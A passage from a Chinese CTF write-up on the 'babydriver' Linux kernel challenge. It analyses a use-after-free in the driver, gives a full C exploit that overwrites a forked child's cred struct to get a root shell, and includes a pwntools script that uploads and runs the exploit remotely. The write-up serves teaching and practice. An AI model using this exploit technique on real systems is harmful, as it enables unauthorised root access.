<li>从 <code>init</code> 脚本中得知 需要分析的驱动文件的所在路径为 <code>/lib/modules/4.4.72/babydriver.ko</code> ，另外该驱动可能对应设备 <code>/dev/babydev</code> ，具体是否存在这种对应关系还需要分析 <code>babydriver.ko</code> 中是否有注册 <code>babydev</code> 设备的操作。</li>
<li><code>setsid cttyhack setuidgid 1000 sh</code> 这条命令决定以非 root 权限启动命令行，如果想要以 root 权限启动命令行需要将 1000 改为 0 。</li>
<li>有的题目可能存在 <code>poweroff -d 0 -f &amp;</code> 命令用来定时关机，在本地调试的时候最好注释掉。</li>
</ul>
<p><strong>分析 babydriver.ko</strong></p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)<span class="built_in">kmem_cache_alloc_trace</span>(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">0x40</span>LL);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">0x40</span>LL;</span><br><span class="line">  <span class="built_in">printk</span>(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>babyopen()</code> 函数中，申请了一个 <code>0x40</code> 大小的堆，然后将堆地址和大小赋给 <code>babydev_struct</code> 这个结构体的成员。<code>babydev_struct</code>是一个全局变量，未设置任何保护措施。因此，当有两个用户同时打开<code>open(&quot;/dev/babydev&quot;,2)</code>该设备节点时，后一个 <code>open</code> 操作，将覆盖<code>babydev_struct.device_buf</code>上的值，导致两个用户（不同fd）指向同一堆块。</p>
<hr>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    <span class="built_in">copy_to_user</span>(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>babyread()</code>函数逻辑简单，判断<code>babydev_struct.device_buf_len</code>是否大于用户态传入的长度(rdx)，如果满足条件则将<code>babydev_struct.device_buf</code>指向的内容拷贝到用户态。</p>
<hr>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    <span class="built_in">copy_from_user</span>();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>babywrite()</code>函数跟<code>babyread()</code>函数类似，判断条件通过后，将用户态的数据拷贝给<code>babydev_struct.device_buf</code>。</p>
<hr>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">kfree</span>(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="type">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printk</span>(&amp;unk_2EB);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>babyioctl()</code>只有一个分支（command），它先将<code>babydev_struct.device_buf</code>指向的堆块释放掉，然后根据用户态传入的<code>arg</code>参数申请任意大小堆块，并更新<code>babydev_struct</code>结构体中两个成员。</p>
<hr>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  <span class="built_in">kfree</span>(babydev_struct.device_buf);</span><br><span class="line">  <span class="built_in">printk</span>(<span class="string">&quot;device release\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>babyrelease()</code>函数在<code>close(fd)</code>关闭设备节点时会被调用到，这里释放了<code>babydev_struct.device_buf</code>指向的堆块，但是并没有置空，存在一个<code>UAF</code>漏洞，<code>babydev_struct</code>是全局变量，如果我们<code>open</code>设备两次，那么第二次<code>open</code>的时候就会覆盖第一次<code>open</code>的<code>babydev_struct</code>，此时<code>free</code>掉第一个，第二个指向的就是<code>free</code>后的，因此这里存在一个<code>UAF</code>。利用<code>UAF</code>去修改新进程的<code>CRED</code>结构，从而达成权限提升的效果。</p>
<h4 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h4><p><code>cred</code>结构体大小为 <code>0xa8</code>，那么利用思路就很明确了： 1. 首先打开 <code>babydev</code> 两次，此时第二次申请的内存会覆盖第一次申请的内存地址； 2. 通过 <code>ioctl</code> 修改内存大小为 <code>0xa8</code>，也就是 <code>cred</code> 的大小； 3. 关闭第一个句柄，此时会执行 <code>babyrelease</code> 函数，全局变量中的结构体指向的 <code>0xa8</code> 大小的内存会被释放，而第二个文件句柄依然存在，因此我们获得了一个悬垂指针（指向被释放的内存）； 4. 这时<code>fork</code> 一个子进程，子进程的 <code>cred</code> 正好申请在我们释放的位置（子进程会申请额外创建<code>PCB</code>空间）； 5. 通过悬垂指针我们可以 <code>write</code> 新进程 <code>cred</code> 中的内容，从而实现新进程的权限提升。</p>
<blockquote>
<p><strong>Tips</strong></p>
<p><strong>fork() 执行流程</strong></p>
<ol>
<li>申请 <code>PID</code></li>
<li>申请 <code>PCB</code> 结构</li>
<li>复制父进程的 <code>PCB</code></li>
<li>将子进程的运行状态设置为不可执行的</li>
<li>将子进程中的某些属性清零，某些保留，某些修改</li>
<li>复制父进程的页（用到了写时拷贝技术）</li>
<li>子进程从fork()从下一行代码开始执行</li>
</ol>
<p><strong>写时拷贝技术：</strong> 父子进程在初始阶段共享所有的数据（全局、 栈区、 堆区、 代码）， 内核会将所有的区域设置为只读。 当父子进程中任意一个进程试图修改其中的数据时， 内核才会将要修改的数据所在的区域（页） 拷贝一份。</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* 高版本 glibc 已经移除了这个库，可以用下面三个库替代</span></span><br><span class="line"><span class="comment">* #include &lt;stropts.h&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ioctls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/termbits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 fd1</span></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 子进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="comment">// 子进程从这里开始执行</span></span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] fork error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 子进程没有子进程所以子进程的 pid == 0</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过更改 fd2，修改子进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="type">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root now.&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 父进程 pid == 子进程 pid，父进程调用 wait(NULL) 等待子进程，以免程序提前结束</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因为运行环境中没有一些依赖库，所以我们采取静态编译。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br></pre></td></tr></table></figure></div>

<p>有些时候系统的库可能与内核交互不匹配，导致exp正确也无法完成交互，这时候可以尝试使用 <code>musl-gcc</code>，或者使用docker进行编译。头文件里面的内容需要与目标匹配才能交互，如果 <code>gcc</code> 编译的 <code>exp</code> 过大可以考虑使用 <code>musl-gcc</code> 进行编译，不过例如 <code>userfault_fd</code> 的相关功能 <code>musl</code> 没有，并不能完全替代 gcc ，所以可以尝试使用 docker。</p>
<p><strong>打包文件系统</strong></p>
<p>我们本地调试一般采取打包的方式来方便调试。</p>
<p><em>pack.sh</em></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cp -r rootfs rootfs_tmp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果 gcc 编译的 exp 过大可以考虑使用 musl-gcc 进行编译，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不过例如 userfault_fd 的相关功能 musl 没有，并不能完全替代 gcc</span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">musl-gcc -static -masm=intel -pthread exp.c -o exp</span> </span><br><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br><span class="line">cp exp rootfs_tmp/</span><br><span class="line"></span><br><span class="line">cd rootfs_tmp || exit</span><br><span class="line">find . | cpio -o -H newc &gt;../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">sudo rm -rf rootfs_tmp</span><br></pre></td></tr></table></figure></div>

<p><strong>远程文件传输</strong></p>
<p>一般采取 <code>base64</code> 编码进行传输。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exp = base64.b64encode(f.read())</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	sl()</span><br><span class="line">	rl()</span><br><span class="line">	count = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), <span class="number">0x200</span>):</span><br><span class="line">		sla(<span class="string">b&quot;/ $ &quot;</span>, <span class="string">b&quot;echo -n \&quot;&quot;</span> + exp[i:i + <span class="number">0x200</span>] + <span class="string">b&quot;\&quot; &gt;&gt; /tmp/b64_exp&quot;</span>)</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line">		info(<span class="string">&quot;count: &quot;</span> + <span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line">	sla(<span class="string">b&quot;/ $ &quot;</span>, <span class="string">b&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;/ $ &quot;</span>, <span class="string">b&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;/ $ &quot;</span>, <span class="string">b&quot;/tmp/exploit &quot;</span>)</span><br><span class="line">	<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>

<h4 id="获取-vmlinux"><a href="#获取-vmlinux" class="headerlink" title="获取 vmlinux"></a>获取 vmlinux</h4><p>由于<code>bzImage</code>是压缩过的内核镜像，因此需要获取未经压缩的 <code>vmlinux</code> 镜像用于提供调试符号，以及查找 <code>gadget</code> 和关键结构偏移。我们可以通过编译内核来获取 <code>vmlinux</code>，但即使题目提供了 <code>config</code> 文件，编译出的 <code>vmlinux</code> 中各结构的偏移也不一定与题目提供的 <code>bzImage</code>  相同。编译出的 <code>vmlinux</code> 只是在计算结构体中成员偏移起参考作用，<code>gadget</code> 等涉及在内核中偏移的还是在 <code>vmlinux-to-elf</code>  解压的 <code>vmlinux</code> 中找。</p>
<p><strong><a class="link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip liblzo2-dev</span><br><span class="line">sudo pip3 install --upgrade lz4 zstandard git+https://github.com/clubby789/python-lzo@b4e39df</span><br><span class="line">sudo pip3 install --upgrade git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure></div>

<p><strong>使用方法</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span><br></pre></td></tr></table></figure></div>

<h4 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h4><p>首先需要对 <code>boot.sh</code> 做如下修改：</p>
<ul>
<li>添加 <code>nokaslr</code> 关闭地址随机化。</li>
<li>添加 <code>-s</code>，因为  <code>qemu</code> 其实提供了调试内核的接口，我们可以在启动参数中添加 <code>-gdb dev</code> 来启动调试服务。最常见的操作为在一个端口监听一个 <code>tcp</code> 连接。 <code>QEMU</code> 同时提供了一个简写的方式<code> -s</code>，表示 <code>-gdb tcp::1234</code>，即在 <code>1234</code> 端口开启一个 <code>gdbserver</code>。</li>
</ul>
<p><em>start.sh</em></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -monitor /dev/null -m 64M \</span><br><span class="line">  --nographic \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -cpu kvm64,+smep \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure></div>

<p>为了加载 <code>babydriver.ko</code> 的符号信息，需要获取其代码段的地址，需要修改 <code>init</code> 内容获取 <code>root</code> 权限。</p>
<p><em>.&#x2F;rootfs&#x2F;init</em></p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 0 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure></div>

<p>重新打包并启动系统，查询代码段地址。</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一种方法</span></span><br><span class="line">-------------------------------------------------</span><br><span class="line">/ # lsmod</span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line">-------------------------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二种方法</span></span><br><span class="line">/ # find /sys/ | grep babydrive</span><br><span class="line">/sys/module/babydriver</span><br><span class="line">/sys/module/babydriver/srcversion</span><br><span class="line">/sys/module/babydriver/notes</span><br><span class="line">/sys/module/babydriver/notes/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/taint</span><br><span class="line">/sys/module/babydriver/initstate</span><br><span class="line">/sys/module/babydriver/coresize</span><br><span class="line">/sys/module/babydriver/sections</span><br><span class="line">/sys/module/babydriver/sections/.bss</span><br><span class="line">/sys/module/babydriver/sections/.init.text</span><br><span class="line">/sys/module/babydriver/sections/.data</span><br><span class="line">/sys/module/babydriver/sections/.text</span><br><span class="line">/sys/module/babydriver/sections/__mcount_loc</span><br><span class="line">/sys/module/babydriver/sections/.strtab</span><br><span class="line">/sys/module/babydriver/sections/.symtab</span><br><span class="line">/sys/module/babydriver/sections/.gnu.linkonce.this_module</span><br><span class="line">/sys/module/babydriver/sections/.rodata.str1.1</span><br><span class="line">/sys/module/babydriver/sections/.note.gnu.build-id</span><br><span class="line">/sys/module/babydriver/sections/.exit.text</span><br><span class="line">/sys/module/babydriver/refcnt</span><br><span class="line">/sys/module/babydriver/uevent</span><br><span class="line">/sys/module/babydriver/holders</span><br><span class="line">/sys/module/babydriver/initsize</span><br><span class="line">/ # cat /sys/module/babydriver/sections/.text</span><br><span class="line">0xffffffffc0000000</span><br></pre></td></tr></table></figure></div>

<p><em>gdb.sh</em></p>
